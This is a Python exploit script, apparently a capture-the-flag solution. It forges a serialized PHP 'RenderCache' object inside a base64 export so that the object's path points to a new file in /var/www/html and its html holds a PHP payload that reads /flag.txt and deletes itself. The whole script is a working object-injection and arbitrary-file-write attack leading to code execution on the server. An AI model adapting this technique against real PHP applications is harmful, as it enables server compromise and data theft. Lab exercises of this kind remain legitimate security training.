#!/usr/bin/env python3

from pathlib import Path
import base64
import re
import sys


if len(sys.argv) != 3:
    raise SystemExit(
        "Usage: python3 knockdown-build-rendercache.py "
        "<legitimate-export.kdb> <fresh-instance-id>"
    )

source = Path(sys.argv[1]).expanduser()
instance_id = sys.argv[2].strip().lower()

if not re.fullmatch(r"[0-9a-f]{8}", instance_id):
    raise SystemExit("Provide the first eight hexadecimal characters from the fresh host.")

output = source.with_name("forged_rendercache.kdb")
decoded_output = source.with_name("forged_rendercache.decoded")

new_path = f"/var/www/html/mmp_kd_{instance_id}.php".encode()
new_html = b"""<?php
$v=@file_get_contents('/flag.txt');
@unlink(__FILE__);
if(preg_match('/WEBVERSE\\{[^}]+\\}/',$v,$m)){
    echo $m[0];
}else{
    echo 'NO_OBJECTIVE_AT_FLAG_TXT';
}
?>"""

encoded = "".join(source.read_text().split())
raw = base64.b64decode(encoded, validate=True)
marker = b'O:11:"RenderCache":2:{'


def replace_property(data: bytes, start: int, prop: bytes, value: bytes) -> bytes:
    key = b"s:" + str(len(prop)).encode() + b':"' + prop + b'";s:'
    position = data.find(key, start)

    if position == -1:
        raise SystemExit(f"[-] Property not found: {prop.decode()}")

    length_start = position + len(key)
    length_end = data.find(b':"', length_start)
    old_length = int(data[length_start:length_end])
    value_start = length_end + 2
    value_end = value_start + old_length

    if data[value_end:value_end + 2] != b'";':
        raise SystemExit(f"[-] Invalid serialized boundary: {prop.decode()}")

    replacement = (
        key
        + str(len(value)).encode()
        + b':"'
        + value
        + b'";'
    )
    return data[:position] + replacement + data[value_end + 2:]


render_cache = raw.find(marker)
if render_cache == -1:
    raise SystemExit("[-] RenderCache not found")

raw = replace_property(raw, render_cache, b"path", new_path)
render_cache = raw.find(marker)
raw = replace_property(raw, render_cache, b"html", new_html)

decoded_output.write_bytes(raw)
output.write_text(base64.b64encode(raw).decode())

print("[+] RenderCache mutation complete")
print(f"[+] path = {new_path.decode()}")
print(f"[+] html length = {len(new_html)} bytes")
print(f"[+] encoded payload = {output}")
print("\n[+] Mutated RenderCache:")
render_cache = raw.find(marker)
print(raw[render_cache:].decode("utf-8", errors="replace"))
